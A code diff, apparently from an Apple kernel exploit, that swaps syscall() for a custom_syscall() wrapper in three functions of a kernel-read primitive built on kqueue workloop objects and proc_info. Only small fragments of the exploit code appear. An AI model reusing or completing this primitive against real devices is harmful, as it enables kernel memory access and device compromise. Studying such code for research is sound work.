@@ -28,7 +28,7 @@ void kread_kqueue_workloop_ctl_allocate(struct kfd* kfd, u64 id)
     u64 options = 0;
     u64 addr = (u64)(&params);
     usize sz = (usize)(params.kqwlp_version);
-    assert_bsd(syscall(SYS_kqueue_workloop_ctl, cmd, options, addr, sz));
+    assert_bsd(custom_syscall(SYS_kqueue_workloop_ctl, cmd, options, addr, sz));
 }
 
 bool kread_kqueue_workloop_ctl_search(struct kfd* kfd, u64 object_uaddr)
@@ -73,7 +73,7 @@ void kread_kqueue_workloop_ctl_deallocate(struct kfd* kfd, u64 id)
     u64 options = 0;
     u64 addr = (u64)(&params);
     usize sz = (usize)(params.kqwlp_version);
-    assert_bsd(syscall(SYS_kqueue_workloop_ctl, cmd, options, addr, sz));
+    assert_bsd(custom_syscall(SYS_kqueue_workloop_ctl, cmd, options, addr, sz));
 }
 
 void kread_kqueue_workloop_ctl_free(struct kfd* kfd)
@@ -99,7 +99,7 @@ u64 kread_kqueue_workloop_ctl_kread_u64(struct kfd* kfd, u64 kaddr)
     u64 arg = kfd->kread.krkw_object_id + kread_kqueue_workloop_ctl_sentinel;
     u64 buffer = (u64)(&data);
     i32 buffersize = (i32)(sizeof(struct kqueue_dyninfo));
-    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
+    assert(custom_syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
 
     kqwl->kqwl_owner = old_kqwl_owner;
     return data.kqdi_owner;
